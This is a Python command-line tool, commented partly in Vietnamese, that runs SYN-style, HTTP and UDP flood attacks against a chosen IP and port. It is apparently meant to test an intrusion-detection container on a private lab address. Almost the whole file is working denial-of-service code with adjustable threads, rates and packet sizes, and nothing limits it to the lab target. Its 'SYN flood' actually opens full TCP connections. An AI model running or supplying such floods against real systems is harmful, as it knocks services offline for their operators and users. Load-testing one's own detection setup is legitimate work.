#!/usr/bin/env python3
"""
External DDoS Testing Tool - Chạy từ máy bên ngoài để test
Target: 172.16.90.9

Usage từ máy bên ngoài:
    # Cài đặt (chỉ cần 1 lần)
    pip install requests
    
    # Chạy test
    python external_ddos_test.py --target 172.16.90.9 --type syn --duration 30
    python external_ddos_test.py --target 172.16.90.9 --port 8001 --type http --duration 60
"""

import argparse
import socket
import random
import time
import threading
from datetime import datetime
import sys

class ExternalDDoSTest:
    """Test DDoS từ máy ngoài vào máy ảo"""
    
    def __init__(self, target_ip: str, target_port: int, threads: int = 5):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.attack_count = 0
        self.running = True
        self.lock = threading.Lock()
        
    def print_banner(self):
        print("=" * 70)
        print("   🔥 DDoS Attack Simulator - External Testing Tool")
        print("=" * 70)
        print(f"   Target IP:   {self.target_ip}")
        print(f"   Target Port: {self.target_port}")
        print(f"   Threads:     {self.threads}")
        print(f"   Time:        {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 70)
        print()
        
    def syn_flood(self, duration: int = 30):
        """
        SYN Flood Attack
        Gửi nhiều SYN packets để làm quá tải connection pool
        """
        print(f"🚀 Starting SYN Flood attack...")
        print(f"⏱️  Duration: {duration} seconds")
        print(f"🎯 Target: {self.target_ip}:{self.target_port}\n")
        
        def worker():
            start_time = time.time()
            local_count = 0
            
            while (time.time() - start_time) < duration and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    
                    try:
                        sock.connect((self.target_ip, self.target_port))
                    except:
                        pass
                    finally:
                        sock.close()
                    
                    local_count += 1
                    
                    with self.lock:
                        self.attack_count += 1
                    
                    # Small delay to avoid overwhelming
                    time.sleep(0.001)
                    
                except Exception as e:
                    continue
            
            print(f"  Thread completed: {local_count} packets sent")
        
        # Start multiple threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor progress
        start_time = time.time()
        while (time.time() - start_time) < duration:
            time.sleep(5)
            elapsed = int(time.time() - start_time)
            rate = self.attack_count / elapsed if elapsed > 0 else 0
            print(f"  📊 Progress: {elapsed}/{duration}s | Total packets: {self.attack_count} | Rate: {rate:.1f} pkt/s")
        
        self.running = False
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=2)
        
        print(f"\n✅ SYN Flood completed!")
        print(f"   Total packets sent: {self.attack_count}")
        print(f"   Average rate: {self.attack_count/duration:.1f} packets/second")
    
    def http_flood(self, duration: int = 30, rate: int = 50):
        """
        HTTP Flood Attack
        Gửi nhiều HTTP requests
        """
        print(f"🚀 Starting HTTP Flood attack...")
        print(f"⏱️  Duration: {duration}s | Target rate: {rate} req/s")
        print(f"🎯 Target: http://{self.target_ip}:{self.target_port}\n")
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        ]
        
        paths = ["/", "/metrics", "/health", "/api", "/status"]
        
        def worker():
            start_time = time.time()
            local_count = 0
            
            while (time.time() - start_time) < duration and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target_ip, self.target_port))
                    
                    # Random HTTP request
                    path = random.choice(paths)
                    user_agent = random.choice(user_agents)
                    
                    request = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {user_agent}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    
                    sock.send(request.encode())
                    
                    # Try to read response (không quan tâm nội dung)
                    try:
                        sock.recv(1024)
                    except:
                        pass
                    
                    sock.close()
                    
                    local_count += 1
                    with self.lock:
                        self.attack_count += 1
                    
                    # Rate limiting
                    time.sleep(1.0 / (rate / self.threads))
                    
                except Exception as e:
                    continue
            
            print(f"  Thread completed: {local_count} requests sent")
        
        # Start threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor
        start_time = time.time()
        while (time.time() - start_time) < duration:
            time.sleep(5)
            elapsed = int(time.time() - start_time)
            req_rate = self.attack_count / elapsed if elapsed > 0 else 0
            print(f"  📊 Progress: {elapsed}/{duration}s | Total requests: {self.attack_count} | Rate: {req_rate:.1f} req/s")
        
        self.running = False
        
        for t in threads:
            t.join(timeout=2)
        
        print(f"\n✅ HTTP Flood completed!")
        print(f"   Total requests sent: {self.attack_count}")
        print(f"   Average rate: {self.attack_count/duration:.1f} requests/second")
    
    def udp_flood(self, duration: int = 30, packet_size: int = 1024):
        """
        UDP Flood Attack
        Gửi nhiều UDP packets
        """
        print(f"🚀 Starting UDP Flood attack...")
        print(f"⏱️  Duration: {duration}s | Packet size: {packet_size} bytes")
        print(f"🎯 Target: {self.target_ip}:{self.target_port}\n")
        
        def worker():
            start_time = time.time()
            local_count = 0
            
            # Random payload
            payload = bytes([random.randint(0, 255) for _ in range(packet_size)])
            
            while (time.time() - start_time) < duration and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    sock.close()
                    
                    local_count += 1
                    with self.lock:
                        self.attack_count += 1
                    
                    time.sleep(0.001)
                    
                except Exception as e:
                    continue
            
            print(f"  Thread completed: {local_count} packets sent")
        
        # Start threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor
        start_time = time.time()
        while (time.time() - start_time) < duration:
            time.sleep(5)
            elapsed = int(time.time() - start_time)
            rate = self.attack_count / elapsed if elapsed > 0 else 0
            mbps = (self.attack_count * packet_size * 8) / (elapsed * 1000000) if elapsed > 0 else 0
            print(f"  📊 Progress: {elapsed}/{duration}s | Packets: {self.attack_count} | Rate: {rate:.1f} pkt/s | {mbps:.2f} Mbps")
        
        self.running = False
        
        for t in threads:
            t.join(timeout=2)
        
        print(f"\n✅ UDP Flood completed!")
        print(f"   Total packets sent: {self.attack_count}")
        print(f"   Total data: {self.attack_count * packet_size / (1024*1024):.2f} MB")

def main():
    parser = argparse.ArgumentParser(
        description='DDoS Testing Tool - Chạy từ máy bên ngoài',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # SYN Flood attack 30 giây
  python external_ddos_test.py --target 172.16.90.9 --port 80 --type syn --duration 30
  
  # HTTP Flood với 100 req/s
  python external_ddos_test.py --target 172.16.90.9 --port 8001 --type http --rate 100 --duration 60
  
  # UDP Flood với packets lớn
  python external_ddos_test.py --target 172.16.90.9 --port 53 --type udp --packet-size 2048 --duration 30
  
  # Multi-threaded attack (10 threads)
  python external_ddos_test.py --target 172.16.90.9 --type syn --threads 10 --duration 30

⚠️  WARNING: Chỉ sử dụng trên hệ thống test của bạn!
        """
    )
    
    parser.add_argument('--target', required=True, help='Target IP address (e.g., 172.16.90.9)')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--type', choices=['syn', 'http', 'udp'], default='syn', 
                        help='Attack type')
    parser.add_argument('--duration', type=int, default=30, 
                        help='Duration in seconds (default: 30)')
    parser.add_argument('--threads', type=int, default=5, 
                        help='Number of threads (default: 5)')
    parser.add_argument('--rate', type=int, default=50, 
                        help='Requests per second for HTTP flood (default: 50)')
    parser.add_argument('--packet-size', type=int, default=1024, 
                        help='Packet size for UDP flood (default: 1024)')
    
    args = parser.parse_args()
    
    # Validate target IP
    try:
        socket.inet_aton(args.target)
    except socket.error:
        print(f"❌ Invalid IP address: {args.target}")
        sys.exit(1)
    
    # Create simulator
    simulator = ExternalDDoSTest(args.target, args.port, args.threads)
    simulator.print_banner()
    
    try:
        if args.type == 'syn':
            simulator.syn_flood(args.duration)
        elif args.type == 'http':
            simulator.http_flood(args.duration, args.rate)
        elif args.type == 'udp':
            simulator.udp_flood(args.duration, args.packet_size)
    except KeyboardInterrupt:
        print("\n\n⚠️  Attack interrupted by user")
        simulator.running = False
        sys.exit(0)
    
    print("\n" + "=" * 70)
    print("   🏁 Test completed!")
    print("   📊 Check logs trên server: docker logs -f ids_ddos_detector")
    print("=" * 70)

if __name__ == '__main__':
    main()
